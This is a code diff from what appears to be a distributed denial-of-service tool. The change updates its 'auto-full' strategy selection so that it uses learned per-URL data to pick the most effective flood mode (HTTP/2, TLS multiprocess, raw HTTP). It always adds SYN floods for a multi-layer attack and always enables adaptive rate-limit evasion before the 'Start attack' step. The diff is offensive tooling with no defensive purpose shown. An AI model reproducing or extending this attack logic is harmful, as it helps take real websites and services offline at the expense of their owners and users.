@@ -3461,23 +3461,38 @@ examples:
             pass
         print(f"[auto-full] rate limit: {'YES' if rate_limit_detected else 'NO'}", file=sys.stderr)
         
-        # 3. Strategy selection (based on actual detection)
+        # 3. Strategy selection (based on actual detection + learning data)
         print("[auto-full] 3/5: 최적 전략 선택...", file=sys.stderr)
-        # Based on detection, choose best combo
-        if 'https' in detected_protocols:
-            if protocol_version == 'h2':
-                strategy = ['h2', 'httpsmp', 'syn']  # H2 + TLS multiproc + SYN
-            else:
-                strategy = ['httpsmp', 'syn']  # TLS multiproc + SYN
+        
+        # Check learning data for this URL
+        learned_mode, learned_threads, learn_info = _recommend_mode(args.url)
+        if learned_mode:
+            print(f"[auto-full] learned best: {learned_mode} ({learn_info})", file=sys.stderr)
+            # Use learned mode as primary strategy
+            strategy = [learned_mode]
+            # Add L4 (syn) for multi-layer
+            strategy.append('syn')
         else:
-            if protocol_version == 'h2':
-                strategy = ['h2mp', 'raw', 'syn']  # H2 multiproc + raw + SYN
+            # No learning data, use detection-based strategy
+            if 'https' in detected_protocols:
+                if protocol_version == 'h2':
+                    strategy = ['h2', 'httpsmp', 'syn']
+                else:
+                    strategy = ['httpsmp', 'syn']
             else:
-                strategy = ['raw', 'syn']  # raw + SYN
+                if protocol_version == 'h2':
+                    strategy = ['h2mp', 'raw', 'syn']
+                else:
+                    strategy = ['raw', 'syn']
+        
         # If rate limit detected, add adaptive
         if rate_limit_detected:
             print("[auto-full] rate limit detected → enabling adaptive", file=sys.stderr)
             _ADAPTIVE[0] = True
+        else:
+            # Always enable adaptive in auto-full mode
+            _ADAPTIVE[0] = True
+        
         print(f"[auto-full] strategy: {', '.join(strategy)}", file=sys.stderr)
         
         # 4. Start attack (use strategy as modes)
